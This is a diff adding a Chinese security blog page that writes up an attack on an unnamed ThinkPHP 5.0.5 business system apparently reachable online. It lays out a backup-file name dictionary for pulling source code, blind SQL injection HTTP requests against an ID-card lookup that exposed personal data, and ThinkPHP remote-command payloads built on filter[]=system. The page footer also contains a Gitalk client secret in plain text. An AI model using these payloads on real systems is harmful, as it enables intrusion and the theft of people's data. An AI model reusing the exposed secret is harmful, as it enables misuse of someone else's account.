@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="loecho">
+<meta name="description" content="安全行业的从业人员">
+<meta name="keywords" content="">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                <!--点击特效-->
+                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
+                
+                        <!--CDN样式-->
+                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://1oecho.github.io">
+                    
+                </a>
+            </div>
+
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                        Index
+                    </a>
+                    
+                    <a class="menu-item" href="https://1oecho.github.io/tags">
+                        Tags
+                    </a>
+                    
+                    <a class="menu-item" href="https://github.com/loecho-sec">
+                        Whoami
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://1oecho.github.io">
+                            
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                            Index
+                        </a>
+                        
+                        <a class="menu-item" href="https://1oecho.github.io/tags">
+                            Tags
+                        </a>
+                        
+                        <a class="menu-item" href="https://github.com/loecho-sec">
+                            Whoami
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                代码审计: 某Thinkphp系统审计
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2020-10-22</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">3.9
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">876</a></span>
+                                        
+                                            <span class="post-category">&#x5206;&#x7C7B;:
+                                
+                                <a href="https://1oecho.github.io/APp2o1EPC/">实战TIPS</a>
+                                
+                            </span>
+                                            
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <h2 id="0x01-开始">0x01 开始：</h2>
+<h4 id="基本信息">[+] 基本信息：</h4>
+<ul>
+<li>
+<p>Thinkphp5.0.5</p>
+</li>
+<li>
+<p>存在WAF，貌似是某武盾</p>
+</li>
+<li>
+<p>某费业务系统</p>
+</li>
+</ul>
+<h4 id="关键点">[+] 关键点：</h4>
+<p>在得到目标域名时，结合目公司名称关键字,还有域名的关键字，试着与敏感的备份文件简单组合一下，得到简单的敏感文件字典，字典大致格式为,进行简单的目录扫描，手动去测试逻辑部分，不一会儿目录扫描结果得到业务系统的备份文件，名称为: <code>关键字+backup.tar.gz</code>：</p>
+<figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022102928.png" alt="image-20201022102928786" loading="lazy"></figure>
+<pre><code>关键字+buckup.zip
+关键字+buckup.rar
+关键字+buckup.zip.tar
+关键字+buckup.tar.gz
+www+关键字.zip
+www+关键字.rar
+www+关键字.zip.tar
+www+关键字.tar.gz
+关键字.zip
+关键字.rar
+可以随意组合即可，也可以看一下参数命名方式，猜测管理员的命名习惯.....
+</code></pre>
+<h2 id="0x02-代码审计">0x02 代码审计</h2>
+<p>系统是由ThinkPHP5.0.5进行二次开发而搭建的，因为以前只是简单看过ThinkPHP代码，并不了解Thinkphp，google了一下，对应目录结构，看一下代码：</p>
+<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022103324.png" alt="image-20201022103324713" loading="lazy"></figure>
+<h3 id="系统路由">[+] 系统路由：</h3>
+<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022103835.png" alt="image-20201022103835424" loading="lazy"></figure>
+<h3 id="sql注入漏洞">[+] SQL注入漏洞</h3>
+<p><code>身份证号处：</code></p>
+<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022104252.png" alt="image-20201022104252294" loading="lazy"></figure>
+<h5 id="1正常传参">（1）正常传参：</h5>
+<p>对输入没有任何限制，只是前端限制了输入长度，抓包后，随便传个id，就得到个人数据</p>
+<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022094104.png" alt="image-20201022094104722" loading="lazy"></figure>
+<h5 id="2注入测试">（2）注入测试</h5>
+<ul>
+<li>存在WAF，后端数据库为<code>MySQL</code>，<code>ThinkPHP-dubug</code> 也没有开启，简单构造盲注证明一下危害即可：</li>
+</ul>
+<figure data-type="image" tabindex="6"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022105805.png" alt="image-20201022105805275" loading="lazy"></figure>
+<h4 id="payload">Payload:</h4>
+<figure data-type="image" tabindex="7"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022105500.png" alt="image-20201022105500870" loading="lazy"></figure>
+<ul>
+<li>查询user长度，长度为14：</li>
+</ul>
+<pre><code>POST /index/index/p_card.html HTTP/1.1
+Content-Length: 59
+Accept: application/json, text/javascript, */*; q=0.01
+DNT: 1
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3538.77 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6
+Connection: close
+
+card=1&quot;)/(case when length(user())=0 then 1 else 0 end)+--+
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022110011.png" alt="image-20201022110011166" loading="lazy"></figure>
+<ul>
+<li>查询内容，因为ascii函数拦截，替换为char函数，缺点是大小写不敏感，用 like binary代替：</li>
+</ul>
+<h5 id="paylaod">Paylaod:</h5>
+<pre><code class="language-pythin">POST /index/index/p_card.html HTTP/1.1
+Content-Length: 71
+Accept: application/json, text/javascript, */*; q=0.01
+DNT: 1
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3538.77 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6
+Connection: close
+
+card=3&quot;)/(case when substr(user(),1,1)like binary 'a' then 1 else 0 end)+--+
+</code></pre>
+<p><strong>注个用户名证明下就可以了….</strong></p>
+<figure data-type="image" tabindex="9"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022110230.png" alt="image-20201022110230634" loading="lazy"></figure>
+<p>看了其他代码之后都是一样的风格，注入有很多处….</p>
+<p>大同小异，都是直接拼接而且没有任何过滤</p>
+<h3 id="thinkphp-rce">[+] THinkPHP RCE</h3>
+<p>ThinkPHP老漏洞，因为目标有WAF自己的被动扫描也没效果，把代码过了一下，发现还是存在，本地搭起来可以复现，具体分析过程可以看<code>y4er大佬博客</code>,我自己跟了一下，结果如下 :</p>
+<figure data-type="image" tabindex="10"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022191221.png" alt="image-20201022191221022" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022191700.png" alt="image-20201022191700891" loading="lazy"></figure>
+<p>**Paylaod: **</p>
+<pre><code>POST?s=index/index
+
+s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system
+aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system
+_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami
+get[]=whaomi&amp;_method=__construct&amp;method=get&amp;filter=system
+</code></pre>
+<p>本地验证成功，WAF没绕过去,自己测试了一下发现WAF拦截的是<code>filter</code>关键字，没其他想法了，卒….</p>
+<figure data-type="image" tabindex="12"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201022141657.png" alt="image-20201022141629131" loading="lazy"></figure>
+<p>前台功能点少，只有几个查询，没啥shell的点….</p>
+<p>太菜了… 总结一下所有SQL摸鱼完事…</p>
+<h2 id="0x03-参考链接">0x03 参考链接</h2>
+<ul>
+<li>THINKPHP目录结构：<code>https://www.kancloud.cn/manual/thinkphp5/118008</code></li>
+<li>Thinkphp5.0.5 RCE 分析：<code>https://y4er.com/post/thinkphp5-rce/</code></li>
+</ul>
+
+                        </div>
+                        
+                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/RealCode-01/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/RealCode-01/&sharesource=qzone&title=代码审计: 某Thinkphp系统审计&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/RealCode-01/&sharesource=weibo&title=代码审计: 某Thinkphp系统审计 + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                        
+                        <a href="https://1oecho.github.io/APp2o1EPC/">#
+                    实战TIPS
+                        </a>
+                        
+                            
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/Net-05/">
+                                                                                            内网渗透: 基础域渗透快速获取域控权限
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/Net-6/">
+                                                                                                    内网渗透：  横向渗透方法总结
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '61442cf87c4266a18189',
+        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
+        repo: 'loecho',
+        owner: '1oecho',
+        admin: ['1oecho'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        loecho-sec
+                            
+                                <b id="hitokoto"></b><br>
+                                
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                         &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://1oecho.github.io/" target="_blank">
+                                                loecho-sec
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.5
+                </div>
+                
+                    <script>
+                        var pat = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
+                    </script>
+        </footer>
+        
+            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
+            
+                <script>
+                    
+                    
+                    loadlive2d();
+                    
+                    
+                    hitokoto();
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1702539383157);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+                
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
